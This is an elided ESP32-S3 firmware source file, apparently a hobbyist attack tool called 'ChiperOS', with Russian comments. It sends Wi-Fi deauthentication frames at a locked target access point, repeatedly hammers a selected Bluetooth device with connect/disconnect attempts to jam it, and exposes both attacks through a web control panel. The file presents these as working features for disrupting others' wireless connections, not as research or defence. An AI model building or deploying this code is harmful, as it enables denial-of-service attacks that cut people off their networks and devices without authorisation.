/*
 * ChiperOS v21.1 - ESP32-S3 DEAUTH + WEB CONTROL (FIXED BLE API)
 * Компилировать через GitHub Actions с патчем patch_deauth.py
 */
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
...
uint32_t seq=0;
String cachedScan = "[]";
const char* AP_NAME = "ХАХАХА Я СПАМЕР";
...
void checkChannel(){
  if(!isLocked || millis()-tLock<20000) return;  int n = WiFi.scanNetworks(false, true, false, 2000);
  bool found=false;
  for(int i=0;i<n;i++){
    if(WiFi.BSSID(i) && memcmp(WiFi.BSSID(i), tgt, 6)==0){
...
// === TX: DEAUTH (РАБОТАЕТ ТОЛЬКО С ПАТЧЕМ ДРАЙВЕРА) ===
void sendDeauth(const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
    ...
    memcpy(&packet[4], da, 6);
    memcpy(&packet[10], sa, 6);
...
// === FIX: Custom BLE Callback Class ===
class MyScanCB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) override {
    // Пустой коллбэк - просто чтобы удовлетворить интерфейс
  }
};
...
void hSt(){
  ...
  srv.send(200,"application/json","{\"mode\":\""+String(task==M_IDLE?"IDLE":task==M_JAM?"DEAUTH":task==M_BLEJAM?"BLE":"AP")+"\",\"c\":"+String(ch)+",\"m\":\""+String(m)+"\",\"locked\":"+String(isLocked?"true":"false")+"}");
}
...
void hJam(){
  if(srv.arg("on")=="1"){
    ...
    esp_wifi_set_promiscuous(false); task=M_IDLE;
  }
  srv.send(200,"application/json","{\"ok\":true}");
}

// === FIX: BLE Scan with correct API ===
void hBleScan(){
  if(!pBLEScan){
    BLEDevice::init("");
    pBLEScan = BLEDevice::getScan();
    // Используем наш кастомный коллбэк
  ...
  // FIX: start() возвращает значение, не указатель
...
// === FIX: memcmp with proper array ===
void hBleJam(){
  if(srv.arg("on")=="1"){
    uint8_t empty[6] = {0};
    if(memcmp(bleTgt, empty, 6)==0){ 
      srv.send(400,"application/json","{\"ok\":false,\"msg\":\"SELECT BLE TARGET\"}"); 
      return; 
    }
...
void runBleJam(){
  ...
  if(millis()-tBle>200){    tBle=millis();
    BLEAddress target(bleTgt);
    BLEClient* cli = BLEDevice::createClient();
    if(cli){
      if(cli->connect(target)) cli->disconnect();
      delete cli;
    }
  }
}
...
.net{padding:5px 6px;border-bottom:1px solid #222;display:flex;justify-content:space-between;cursor:pointer;font-size:0.9em}.net:hover{background:#1a1a1a}.net.s{background:#4a1c6e}
...
<div class='hd'><div class='kc'>KOSMOC CREATOR</div><div class='vr'>ChiperOS v21.1 - PATCHED</div><div class='bd'>ESP32-S3</div></div>
<div class='ct'>
<div class='tabs'>
...
async function lock(b){const r=await api('/lock?b='+b);if(r&&r.locked){$('tg').innerHTML=b;$('lk').innerHTML='LOCKED';$('lk').style.color='#0f0';lg('nl','Target saved.');}else{lg('nl','Lock failed');}}async function jam(s){$('jg').disabled=s;$('js').disabled=!s;const r=await api('/jam?on='+(s?1:0));if(!r.ok&&s){lg('jl',r.msg||'SELECT TARGET FIRST');$('jg').disabled=false;$('js').disabled=true;return;}lg('jl',s?'DEAUTH ACTIVE':'Stopped');}
